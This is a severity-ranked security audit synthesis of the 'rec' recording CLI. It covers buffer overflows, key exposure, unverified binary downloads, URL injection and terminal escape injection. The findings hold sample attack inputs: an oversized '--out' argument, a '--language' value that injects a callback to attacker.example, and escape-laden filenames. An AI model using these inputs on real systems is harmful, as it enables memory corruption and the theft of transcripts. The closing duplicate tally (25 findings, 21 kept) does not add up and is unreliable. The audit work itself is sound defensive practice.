# rec audit synthesis (baseline 1a21cf271f98690ef93e09306e7ed9169a444f0f)

Consolidated, de-duplicated, severity-ranked synthesis of six independent surface
audits of the `rec` repository at commit `1a21cf271f98690ef93e09306e7ed9169a444f0f`.

## Methodology

Static source audit only, performed at commit `1a21cf271f98690ef93e09306e7ed9169a444f0f`.
No Zig toolchain was available on the audit host, so nothing in any surface report
or in this synthesis was compiled, built, run, fuzzed, or exercised against a live
microphone/output device or a live terminal. Every finding below is static-only —
derived from reading source, workflow, and script files and tracing data flow by
hand — unless a finding text explicitly says otherwise (e.g. a cited existing
regression test). Six independent surface audits were run in parallel over
disjoint-but-overlapping slices of the codebase, each producing its own report
under `docs/audits/`; this document reconciles those six reports into one
de-duplicated, severity-ranked list. It introduces no new investigation.

## Scope

**Audited (across the six surface reports):** CLI argument parsing and command
dispatch (`src/main.zig`, `src/formatcmd.zig`, `src/transcribecmd.zig`,
`src/sharecmd.zig`, `src/setupcmd.zig`); terminal input decoding (`src/keys.zig`)
and interactive session/job state (`src/audio_notes.zig`); Deepgram and LLM-harness
network/key handling and request construction (`src/transcribe.zig`, `src/llm.zig`,
`src/share.zig`, `src/sharecmd.zig`); the self-updater (`src/update.zig`) and shell
installer (`install.sh`); recording-library scanning, path joining, and selection
resolution (`src/library.zig`); OKF note rendering (`src/okf.zig`); audio capture,
playback, cut, and container handling (`src/record.zig`, `src/capture.zig`,
`src/playback.zig`, `src/cut.zig`, `src/spectrum.zig`, `src/visualizer.zig`,
`src/waveform.zig`, `src/wav.zig`, `src/m4a.zig`); terminal rendering and
escape/control-character handling (`src/viewport.zig`, `src/markdown.zig`,
`src/style.zig`, `src/ruler.zig`, `src/player.zig`, `src/deck.zig`, `src/live.zig`,
`src/command_ui.zig`); and the build/CI/release/installer supply chain
(`build.zig`, `build.zig.zon`, `.github/workflows/ci.yml`,
`.github/workflows/release.yml`, `.github/workflows/quality.yml`, `install.sh`,
`install.ps1`, `githooks/pre-commit`, `githooks/commit-msg`, and the
`scripts/e2e_transcribe.py` / `scripts/e2e_viewer.py` CI harnesses).

**Not audited (gaps common to all six surface reports, or explicitly out of
scope for every one of them):** anything requiring a Zig toolchain, a build, or
program execution (all six reports are static-source-only); the vendored
`vendor/miniaudio.h` C source itself; the macOS AudioToolbox/CoreFoundation
system-framework internals `src/m4a.zig` calls into; Windows-only code paths in
`src/update.zig` (no Windows host available to exercise TOCTOU timing);
`install.ps1`'s full logic beyond the integrity-check question covered in
FINDING-SYNTH-09; the Deepgram and GitHub services themselves; the Zig standard
library's and curl's internal TLS implementations; five of the seven E2E harness
scripts referenced from CI (`scripts/e2e_record_silence.py`,
`scripts/e2e_playback_notes.py`, `scripts/e2e_notes_jobs.py`,
`scripts/e2e_player.py`, `scripts/e2e_resize.py`); and third-party harness CLI
binaries (`claude`, `codex`, etc.) invoked by `src/llm.zig`, treated as trusted
external tools.

## Summary

| Severity | Count |
|---|---|
| critical | 4 |
| major | 10 |
| minor | 5 |
| **Total** | **19** |

## Findings

| id | severity | class | surface | location |
|---|---|---|---|---|
| FINDING-SYNTH-01 | critical | security/bug | cli-and-input | `src/transcribecmd.zig:160-163`, `src/record.zig:616-621` |
| FINDING-SYNTH-02 | critical | security/bug | audio-memory-safety | `src/playback.zig:577-583`, `src/record.zig:616-621` |
| FINDING-SYNTH-03 | critical | security | network-and-secrets | `src/transcribe.zig:152-173` |
| FINDING-SYNTH-04 | critical | security | build-and-supply-chain | `.github/workflows/quality.yml:18-29` |
| FINDING-SYNTH-05 | major | security | cli-and-input | `src/transcribe.zig:21-34`, `src/transcribecmd.zig:51-54,176` |
| FINDING-SYNTH-06 | major | bug | cli-and-input | `src/formatcmd.zig:211-219` |
| FINDING-SYNTH-07 | major | robustness | network-and-secrets | `src/transcribe.zig:158-184` |
| FINDING-SYNTH-08 | major | robustness | network-and-secrets | `src/transcribe.zig:179-198` |
| FINDING-SYNTH-09 | major | security | network-and-secrets, filesystem-and-update, build-and-supply-chain | `src/update.zig:254-263`, `install.sh:42-61,76`, `install.ps1:29-31,50` |
| FINDING-SYNTH-10 | major | bug | filesystem-and-update | `src/wav.zig:182`, `src/record.zig:406-420,328` |
| FINDING-SYNTH-11 | major | bug | audio-memory-safety | `src/wav.zig:83-104` |
| FINDING-SYNTH-12 | major | security | terminal-and-rendering | `src/library.zig:246,365,423`, `src/command_ui.zig:9-11` |
| FINDING-SYNTH-13 | major | security | terminal-and-rendering | `src/markdown.zig:103-119` |
| FINDING-SYNTH-14 | major | security | build-and-supply-chain | `.github/workflows/release.yml:7-9,27-47` |
| FINDING-SYNTH-15 | minor | robustness | cli-and-input | `src/setupcmd.zig:343-358` |
| FINDING-SYNTH-16 | minor | security | filesystem-and-update | `src/update.zig:251` |
| FINDING-SYNTH-17 | minor | robustness | filesystem-and-update | `src/wav.zig:184` |
| FINDING-SYNTH-18 | minor | robustness | terminal-and-rendering | `src/viewport.zig:45` |
| FINDING-SYNTH-19 | minor | security | build-and-supply-chain | `.github/workflows/ci.yml:18-19,44-45,67-68`, `release.yml:49,52`, `quality.yml:14` |

## FINDING-SYNTH-01: Unbounded `--out` copy overflows a fixed stack buffer in `rec transcribe`

- **Severity:** critical
- **Class:** security/bug
- **Location:** `src/transcribecmd.zig:160-163`, sink helper at `src/record.zig:616-621`
- **Evidence:** `ta.out` (the raw, unbounded string after `--out`, parsed at `src/transcribecmd.zig:55-58`) is copied into a fixed `[std.Io.Dir.max_path_bytes]u8` (4096-byte) stack buffer via `record.appendStr`, which writes every input byte with **no check** of `n.*` against `buf.len`.
- **Failure mode:** `rec transcribe --out "$(python3 -c "print('A'*8192)")"` writes past the end of `out_path_buf` on the stack. Every other fixed-buffer path join in the codebase (`formatcmd.zig`'s own `--out` handling, `library.recordingPath`) bounds-checks first; this call site does not.
- **Impact:** Stack buffer overflow reachable directly from a CLI argument. In a safety-checked build this is a reachable runtime panic (DoS on a legitimate long path or scripted caller); in `-Doptimize=ReleaseFast` — the mode CI ships (`.github/workflows/release.yml:57`, confirmed in `docs/audits/06-build-and-supply-chain.md`) — bounds-check panics are elided, so this is real stack memory corruption with attacker-controlled content adjacent to `run`'s return address and locals.
- **Suggested fix:** Bound the copy: reject `p.len >= out_path_buf.len` on the existing usage-error path, or build the path with `std.fmt.bufPrint` as `formatcmd.zig` already does for its own `--out`.

## FINDING-SYNTH-02: Unbounded recording filename overflows a fixed stack buffer building the sibling transcript path

- **Severity:** critical
- **Class:** security/bug
- **Location:** `src/playback.zig:577-583`, same unchecked helper at `src/record.zig:616-621`
- **Evidence:** `transcriptPath` copies `library.stripExt(name)` plus `".md"` into an 80-byte stack buffer (`md_name_buf`) via the same unbounded `record.appendStr` as FINDING-SYNTH-01.
- **Failure mode:** `library.scan` enumerates every `.wav`/`.m4a` file under `~/recordings/` with no length cap. `rec play <name>` in its non-interactive path (`playSelection`, taken whenever stdout/stdin is not a TTY) calls `loadTranscript` → `transcriptPath` with that filename; once the stem exceeds ~78 bytes (well inside the ~255-byte `NAME_MAX` most filesystems allow), the copy overruns `md_name_buf`. Reachable via a synced/received file or a simple rename, with no CLI argument required.
- **Impact:** Same memory-corruption class as FINDING-SYNTH-01, reached through an on-disk filename rather than an argv value, in ReleaseFast binaries the project ships.
- **Note:** This finding and FINDING-SYNTH-01 share the same unsafe root primitive — `record.appendStr` performs an unbounded byte-by-byte copy with no caller-independent bounds check — but are two independently reachable call sites (a CLI flag vs. a filesystem-derived filename) discovered by different surface audits (`01-cli-and-input.md`, `04-audio-memory-safety.md`) and are kept as separate findings.
- **Suggested fix:** Bound the copies in `transcriptPath` exactly like `library.recordingPath` already does, or build the path with `std.fmt.bufPrint`/heap `allocPrint` as `audio_notes.zig` already does for the same sibling-`.md` path. Consider also fixing `record.appendStr` itself to bounds-check, closing this class of bug at the source for any future caller.

## FINDING-SYNTH-03: Deepgram API key placed on curl's argv, visible via `ps`/`/proc`

- **Severity:** critical
- **Class:** security
- **Location:** `src/transcribe.zig:152-173`
- **Evidence:** `transcribe()` builds `Authorization: Token <DEEPGRAM_API_KEY>` via `std.fmt.allocPrint` and passes it as a literal `-H` argv element to `curl`, spawned via `std.process.run`/`execve`.
- **Failure mode:** For the lifetime of the request (unbounded — see FINDING-SYNTH-07), the plaintext API key is visible in `/proc/<pid>/cmdline` and `ps auxww` to any local user or process on the same host — other users on a shared machine, container sidecars, crash/monitoring agents, shell-history/process-snapshot tools.
- **Impact:** Full disclosure of the user's Deepgram API key to any local process-table observer while `rec transcribe` runs, without needing filesystem access to the correctly-`0600` `deepgram_key` file or to the environment.
- **Suggested fix:** Do not put the Authorization header value on argv. Feed it to curl via `-K -`/`--config` over stdin, or a temporary `0600` header file consumed with curl's `@file` header syntax, mirroring the `0600` handling `storeKey` already uses in the same file.

## FINDING-SYNTH-04: CI installs and executes an unauthenticated third-party binary with no integrity check

- **Severity:** critical
- **Class:** security
- **Location:** `.github/workflows/quality.yml:18-29`
- **Evidence:** The workflow `curl -fsSL`s a `sentrux-linux-x86_64` release binary from `sentrux/sentrux` by version tag only, `chmod +x`s it, and runs `sentrux check .` / `sentrux gate .` — with no checksum, signature, or provenance check anywhere in the step.
- **Failure mode:** This job runs unattended on every `push` to `main` and every `pull_request` (`quality.yml:3-6`), with no maintainer approval gate. If the referenced release asset is ever replaced under the same tag, or the `sentrux/sentrux` account/repo is compromised, the next CI run executes the attacker's binary.
- **Impact:** The executed binary would have full access to the repository checkout, the runner's network egress, and whatever `GITHUB_TOKEN`/environment the job carries — triggerable by any pull request against the repo, with no code change to `rec` itself needed.
- **Suggested fix:** Pin and verify a SHA-256 (or signature) for `SENTRUX_VERSION`, fetching a checksums file (or `cosign verify`) before `chmod +x`, failing the job on mismatch.

## FINDING-SYNTH-05: `--language` is concatenated unescaped into the Deepgram request URL

- **Severity:** major
- **Class:** security
- **Location:** `src/transcribe.zig:21-34`, built from `src/transcribecmd.zig:51-54`, used at `src/transcribecmd.zig:176`
- **Evidence:** `buildListenUrl` appends the raw `language` argument straight into the query string with no URL-encoding of `&`, `#`, `%`, or other reserved characters.
- **Failure mode:** `parseTranscribeArgs` accepts any string after `--language` unrestricted. A value like `en&callback=http://attacker.example/hook` injects an additional Deepgram `callback` webhook parameter (or overrides `smart_format`/`punctuate`/`utterances`/`diarize_model`/`mip_opt_out`) into the live request.
- **Impact:** A caller (or automation forwarding untrusted text into `--language`) can redirect Deepgram's transcription result to an arbitrary external endpoint or alter request behavior — a request/response exfiltration path for recording content sent to Deepgram.
- **Suggested fix:** Validate `--language` against Deepgram's known code syntax (e.g. `^[a-z]{2}(-[A-Z]{2})?$` or `auto`), or percent-encode before splicing into the URL.

## FINDING-SYNTH-06: `rec format --out` overwrite guard is a raw string compare, not a path-equivalence check

- **Severity:** major
- **Class:** bug
- **Location:** `src/formatcmd.zig:211-219`
- **Evidence:** The only guard against overwriting the source transcript is `std.mem.eql(u8, p, source_path)` — a byte-for-byte string compare.
- **Failure mode:** A `--out` value naming the same file through a different valid spelling (leading `./`, differing slash count, relative vs. the absolute form `resolveSource` produced) passes the check, and `writeFile` then truncates that path, silently overwriting the original transcript with the LLM's formatted output.
- **Impact:** Silent data loss of the source transcript — the command reports success while destroying the input it just read.
- **Suggested fix:** Compare resolved/canonicalized paths (e.g. `realpath`) rather than raw strings before deciding whether `--out` targets the source file.

## FINDING-SYNTH-07: Deepgram request has no timeout, so `rec transcribe` can hang forever

- **Severity:** major
- **Class:** robustness
- **Location:** `src/transcribe.zig:158-184`
- **Evidence:** The curl argv carries no `--max-time`/`--connect-timeout`, and `std.process.run(gpa, io, .{ .argv = &argv })` passes no `timeout`, so `RunOptions.timeout` defaults to `.none`.
- **Failure mode:** A stalled TCP connection, slow-loris response, or an outage that accepts the connection but never completes leaves `rec transcribe` blocked indefinitely, with no way for the user to distinguish "hung" from "still uploading." `src/update.zig:218,307` already guards against exactly this with `--max-time`, so the omission here is an inconsistency rather than a deliberate choice.
- **Impact:** A single unresponsive or malicious network peer can wedge `transcribe` (and any background job driving it via `audio_notes.zig`) with no bound, forcing a manual kill.
- **Suggested fix:** Add `--max-time` to the curl argv, and/or pass a `timeout` in the `std.process.run` call.

## FINDING-SYNTH-08: Deepgram response body is read with no size limit

- **Severity:** major
- **Class:** robustness
- **Location:** `src/transcribe.zig:179-198`
- **Evidence:** Neither `stdout_limit` nor `stderr_limit` is set on the `std.process.run` call, so both default to `.unlimited`; curl's entire stdout is buffered, then copied again into `out.json`.
- **Failure mode:** Any endpoint able to answer the POST — a compromised Deepgram deployment, a captured DNS/proxy redirect to an attacker-controlled HTTPS host with a trusted certificate, or simply a buggy response — can return an arbitrarily large body, unlike `llm.zig`'s harness calls, which cap output at 8 MiB (`src/llm.zig:515`) via `drainPipe`'s explicit cap.
- **Impact:** Unbounded memory growth / OOM kill of the `rec` process from an oversized HTTP response, with no cap analogous to the one already used for LLM harness output.
- **Suggested fix:** Pass an explicit `stdout_limit`/`stderr_limit` sized like `llm.zig`'s `max_output_bytes`, or add curl's `--max-filesize`.

## FINDING-SYNTH-09: Release binaries are downloaded and executed with no integrity verification, at three separate call sites

- **Severity:** major
- **Class:** security
- **Location:** `src/update.zig:254-263` (self-updater); `install.sh:42-61,76` (shell installer); `install.ps1:29-31,50` (PowerShell installer)
- **Consolidated finding:** merges four surface-report findings sharing one root cause; see the severity-reconciliation note below.
- **Evidence:**
  - `src/update.zig`: `downloadTo` fetches the `browser_download_url` from the GitHub Releases API JSON via `curl -fsSL`, and `apply()` `chmod 755`s and `renameAbsolute`s the result directly over the running executable — no checksum/signature/`verify` token anywhere in the file.
  - `install.sh`: the README's advertised `curl -fsSL .../install.sh | sh` one-liner scrapes a `download_url` from the same unauthenticated API, `curl -fsSL -o`s it, `chmod 755`s it, moves it onto `PATH`, and immediately runs `"$dest" --help`.
  - `install.ps1`: `Invoke-WebRequest $asset.browser_download_url -OutFile $dest` followed by `& $dest --help`, same absence of a checksum/signature check.
- **Failure mode:** None of the three sites compares the downloaded bytes against any second, independently-rooted trust anchor; `curl -f`/`Invoke-WebRequest` success only guarantees a 2xx HTTP status, not artifact authenticity. `src/update.zig`'s path runs unattended once a day via `autoCheck` before ordinary commands, with no user confirmation.
- **Impact:** A tampered release asset (compromised publishing credentials, a re-uploaded asset under an existing GitHub release tag, a poisoned CDN edge, or a MITM against a client trusting a rogue CA) becomes trusted, persisted code — executed on first install (`install.sh`/`install.ps1`) and again on every subsequent `rec` invocation via the silent daily self-update (`src/update.zig`).
- **Note — severity reconciliation:** `docs/audits/02-network-and-secrets.md` rated the `src/update.zig` instance **minor** (FINDING-NS-04); `docs/audits/03-filesystem-and-update.md` rated both the `src/update.zig` instance (FINDING-UPD-01) and the `install.sh` instance (FINDING-INST-01) **major**; `docs/audits/06-build-and-supply-chain.md` rated the combined `install.sh`+`install.ps1` instance (FINDING-BSC-03) **major**. All four describe the same root cause — unauthenticated, unverified GitHub release binaries trusted and executed at rec's install/update boundary — so they are merged here as one finding at the maximum severity found across surfaces, **major**, spanning all three call sites.
- **Suggested fix:** Publish a checksum or detached signature alongside each release asset in `release.yml`, embed the corresponding pinned checksum source or public key in the client and both installers, and verify it — failing closed — before `chmod +x`/`renameAbsolute`/execution at all three sites.

## FINDING-SYNTH-10: Concurrent recordings started in the same second corrupt or silently overwrite each other

- **Severity:** major
- **Class:** bug
- **Location:** `src/wav.zig:182` (`create_write_flags`, no `O_EXCL`), `src/record.zig:406-420` (one-second-resolution filename), `src/record.zig:328` (publish rename)
- **Evidence:** Filenames come only from `localTimestamp` at one-second resolution with no uniqueness suffix; `create_write_flags` is `O_WRONLY | O_CREAT | O_TRUNC`, no `O_EXCL`.
- **Failure mode:** Two `rec record` invocations started within the same wall-clock second (two terminal panes, a retried script, a hotkey double-fire) compute an identical temp and final path. Whichever `Encoder.init` opens second truncates the first's in-progress audio; at completion, whichever `publish()` renames last silently replaces the other's finished recording, with no error surfaced to either user.
- **Impact:** Silent data loss of a completed recording, contradicting the "finish-before-expose" guarantee the code comment at `record.zig:321-323` claims for the single-recorder case.
- **Suggested fix:** Include a per-process uniqueness component in the filename (PID, counter, or sub-second precision), and/or open the temp file with `O_EXCL` so a same-second collision fails loudly instead of truncating another recorder's data.

## FINDING-SYNTH-11: `wav.Encoder.finish()` leaks the file descriptor on every error path, disabling the `abort()` fallback

- **Severity:** major
- **Class:** bug
- **Location:** `src/wav.zig:83-104`
- **Evidence:** `finish()` sets `self.closed = true` on entry, before the fd is actually closed; all three of its error returns (`error.FinalizeFailed`) leave `self.fd` open.
- **Failure mode:** Because `closed` is already `true`, every caller's `abort()` cleanup fallback becomes a no-op and never closes the descriptor either. The 4 GiB RIFF-ceiling path fires deterministically for any capture whose PCM body exceeds `maxInt(u32) - 36` bytes (a several-hours 48 kHz stereo recording), and the project's own regression test for that path does not check the descriptor was closed.
- **Impact:** A leaked OS file descriptor per failed `finish()`, accumulating across repeated failures in a long-lived process; on Windows the still-open handle also blocks `record.zig`'s own `.part` temp-file cleanup, leaving a stray partially-written recording behind.
- **Suggested fix:** Close the descriptor (or otherwise release the resource) unconditionally before returning any error from `finish()`, mirroring `m4a.zig`'s `finish()`, which disposes its resources first and only inspects the status afterward.

## FINDING-SYNTH-12: Recording filenames reach the terminal with no control-character or escape filtering

- **Severity:** major
- **Class:** security
- **Location:** `src/library.zig:246,365,423`, `src/command_ui.zig:9-11`
- **Evidence:** `scan()` stores the raw filesystem entry name with no validation; `rec list`'s `appendRow`/`appendStr` copy it byte-for-byte to a buffer written straight to stdout via `printStdout`. The same unfiltered name is echoed by `transcribecmd.zig`/`formatcmd.zig` through `command_ui.zig`'s `Mode.print`, an unconditional `stderr().writeStreamingAll` with no filtering.
- **Failure mode:** No code path between the filesystem read and the terminal write strips bytes below 32, byte 127, or ANSI/OSC escape sequences. A file dropped into the recordings directory with a crafted name (e.g. containing `\x1b]0;...\x07` or `\r`) reaches the real terminal verbatim on `rec list`, `rec transcribe <bad-selection>`, or `rec format <bad-selection>`. This is a genuine bypass of an existing, intended control: `deck.cleanTitle` strips exactly this class of byte from recording titles inside the interactive player, but is never applied on these non-interactive paths.
- **Impact:** Window-title spoofing, screen/scrollback manipulation, cursor-position tricks to overwrite or hide prior output, and on terminals honoring OSC 52, a silent write to the system clipboard.
- **Suggested fix:** Route every filename through the same control/escape stripping `cleanTitle` already performs (or funnel `list`/`transcribe`/`format` output through `viewport.Document.set`) before writing to stdout/stderr.

## FINDING-SYNTH-13: `rec view` / `markdown.show()` writes untrusted documents to the terminal unfiltered when stdin is not a tty

- **Severity:** major
- **Class:** security
- **Location:** `src/markdown.zig:103-119`
- **Evidence:** `show()` only routes rendered output through the escape-filtering `viewport.Document.set` when *both* stdin and stderr are a tty; the `!tty` branch calls `write(io, rendered)` directly, and `render()` copies untrusted document text byte-for-byte outside of markdown markers with no stripping anywhere.
- **Failure mode:** `rec view notes.md </dev/null`, a cron/CI invocation, or any pipeline redirecting stdin while stderr still points at the user's terminal sends the fully rendered, unfiltered document to the terminal. The same unfiltered `render()` output also reaches transcripts and LLM-formatted notes opened via `command_ui.zig` (after every `rec transcribe`/`rec format`) and `playback.zig`.
- **Impact:** Any transcript, LLM-formatted note, or arbitrary shared `.md` file containing raw ANSI/OSC bytes (embedded directly, or produced by an LLM asked/tricked into emitting them) is written verbatim to the terminal — the same escape-injection class as FINDING-SYNTH-12, reachable through a plain file argument and common stdin redirection rather than a crafted filename.
- **Suggested fix:** Always filter `rendered` through the same control/escape stripping used by the tty branch before writing it in the `!tty` branch.

## FINDING-SYNTH-14: Release build job carries `pull-requests: write` it never uses, widening the blast radius of a compromised action

- **Severity:** major
- **Class:** security
- **Location:** `.github/workflows/release.yml:7-9,27-47`
- **Evidence:** `permissions:` (`contents: write`, `pull-requests: write`) is declared once at workflow level and applies to every job, including `build`, which only checks out tagged source, cross-compiles, and later runs `gh release upload --clobber` — none of which needs `pull-requests: write`.
- **Failure mode:** The `build` job runs across five matrix runners pulling `actions/checkout@v4` and `mlugg/setup-zig@v2` by mutable version tag (see FINDING-SYNTH-19) rather than a pinned commit SHA, for its entire duration carrying a scope it never exercises.
- **Impact:** If either third-party action is compromised upstream (a moved tag — the same class of incident as the 2025 `tj-actions/changed-files` compromise), the injected code runs with a `GITHUB_TOKEN` scoped to both `contents: write` and `pull-requests: write`, letting it modify or merge pull requests in this repository in addition to tampering with release contents.
- **Suggested fix:** Scope `pull-requests: write` to only the `release-please` job (which opens the release PR) via a per-job `permissions:` block, and pin `actions/checkout`, `mlugg/setup-zig`, and `googleapis/release-please-action` to full commit SHAs.

## FINDING-SYNTH-15: `setupcmd.readLine` desyncs stdin on an over-length line instead of discarding the remainder

- **Severity:** minor
- **Class:** robustness
- **Location:** `src/setupcmd.zig:343-358`
- **Evidence:** The read loop exits at `n == buf.len` without ever consuming the line's terminating `\n` or remaining bytes when the input line exceeds the caller's fixed buffer (64/128/200/256 bytes depending on prompt).
- **Failure mode:** Leftover bytes remain queued on stdin; the *next* `readLine` call (the following prompt) starts by consuming that leftover data instead of a fresh line, silently answering an unrelated prompt with garbage.
- **Impact:** Interactive (or piped) `rec setup` can silently select an unintended harness, provider, or model when a user pastes or pipes a line longer than the receiving buffer — a state-consistency bug in a flow that decides where transcript content gets sent.
- **Suggested fix:** After the loop, if the line was truncated, keep reading and discarding bytes until `\n` or EOF before returning.

## FINDING-SYNTH-16: Update temp file is deleted then recreated without `O_EXCL`, opening a symlink race in shared install directories

- **Severity:** minor
- **Class:** security
- **Location:** `src/update.zig:251`
- **Evidence:** `tmp` is a fixed, predictable path (`"<exe>.update.tmp"`); it is unlinked, then `curl -o <tmp>` (opened `O_CREAT` but not `O_EXCL`) recreates it, following any symlink planted at that path in the window between.
- **Failure mode:** In a shared install location (a group-writable directory, a shared `$HOME/.local/bin` on a multi-user host), another local principal can pre-plant `<exe>.update.tmp` as a symlink to an arbitrary file; the next `rec update` (or the silent daily `autoCheck`) then has curl overwrite the symlink's target with downloaded release bytes, and the subsequent `setPermissions(..., 0o755)` makes that arbitrary target executable.
- **Impact:** Local arbitrary-file-overwrite-and-chmod-executable primitive in shared-directory installs.
- **Suggested fix:** Create the temp file with `O_CREAT | O_EXCL` instead of delete-then-let-curl-recreate, or use a per-run unique filename.

## FINDING-SYNTH-17: WAV recordings are created world-readable by default

- **Severity:** minor
- **Class:** robustness
- **Location:** `src/wav.zig:184`
- **Evidence:** `openNew`'s POSIX branch opens with mode `0o644`, unlike the Windows branch two lines above it, which explicitly requests `0600`/owner-only.
- **Failure mode:** Every WAV recording (the default format on Linux/Windows) and its `.part` temp file during capture are world-readable modulo umask; a default `umask 022` leaves the file readable by every other local account for as long as it exists, including mid-capture.
- **Impact:** On a multi-user host, any other local user can read another user's voice recordings (and derived transcripts/notes) without additional privilege, by listing the recordings directory or knowing the timestamp-derived filename.
- **Suggested fix:** Open WAV files (and the recordings directory) with an explicit `0600`/`0700` mode on POSIX, matching the Windows branch directly above.

## FINDING-SYNTH-18: `viewport.Document.set`'s control-character filter omits byte 127 (DEL)

- **Severity:** minor
- **Class:** robustness
- **Location:** `src/viewport.zig:45`
- **Evidence:** `if (token[0] < 32 and token[0] != '\t') continue;` strips bytes 0-31 (other than `\t`) but not byte 127, unlike `deck.cleanTitle`'s `if (token[0] < 32 or token[0] == 127) continue;`.
- **Failure mode:** `Document.set` — the shared filter used by the interactive player and the markdown viewer's tty branch — lets a literal DEL byte in a transcript/note pass through `cellWidth`'s `utf8Decode` unfiltered.
- **Impact:** A DEL byte reaching the terminal renders or is interpreted inconsistently across emulators (placeholder glyph vs. destructive backspace erasing a previously drawn cell), corrupting the display of that line — a narrower version of the same missing-filter class as FINDING-SYNTH-12/13, not an escape-sequence injection by itself.
- **Suggested fix:** Change the condition to `token[0] < 32 or token[0] == 127` (matching `deck.cleanTitle`), preserving the `\t` exception.

## FINDING-SYNTH-19: GitHub Actions pinned by mutable version tag, not commit SHA

- **Severity:** minor
- **Class:** security
- **Location:** `.github/workflows/ci.yml:18-19,44-45,67-68`, `.github/workflows/release.yml:49,52`, `.github/workflows/quality.yml:14`
- **Evidence:** Every third-party action across all three workflows (`actions/checkout@v4`, `mlugg/setup-zig@v2`, `googleapis/release-please-action@v5`) is referenced by a major/minor version tag.
- **Failure mode:** Upstream maintainers — or an attacker who compromises their account — can move such a tag to any commit at any time; the next workflow run executes whatever is at the new commit with no diff-review step in this repository.
- **Impact:** On `ci.yml`/`quality.yml` this is bounded by their limited default token scope, but the same unpinned actions run inside `release.yml` under the broader permission set described in FINDING-SYNTH-14, meaning an upstream action compromise can reach a job that publishes releases and modifies pull requests.
- **Suggested fix:** Pin each `uses:` line to a full commit SHA, with a trailing version comment for readability.

## Dropped duplicates

No purely duplicate **minor** finding was dropped outright; the one minor/major
overlap found (the `src/update.zig` integrity-check gap rated minor in
`02-network-and-secrets.md` vs. major elsewhere) was merged into
FINDING-SYNTH-09 at its maximum severity rather than dropped, per instructions
to preserve every critical and major finding. All 25 findings across the six
surface reports are accounted for: 21 are retained 1:1 as FINDING-SYNTH-01,
-02, -03, -05, -06, -07, -08, -10, -11, -12, -13, -14, -15, -16, -17, -18, -19,
and 4 (FINDING-NS-04, FINDING-UPD-01, FINDING-INST-01, FINDING-BSC-03) are
merged into the single FINDING-SYNTH-09.

## Surface reports

- `docs/audits/01-cli-and-input.md` — CLI argument parsing, command dispatch, and terminal input decoding.
- `docs/audits/02-network-and-secrets.md` — Deepgram/LLM key handling and HTTP request construction.
- `docs/audits/03-filesystem-and-update.md` — filesystem, recording-library, and self-update defects.
- `docs/audits/04-audio-memory-safety.md` — audio core memory-safety, arithmetic, and resource defects.
- `docs/audits/05-terminal-and-rendering.md` — terminal rendering and escape/control-character handling.
- `docs/audits/06-build-and-supply-chain.md` — build, CI, release, and installer supply chain.
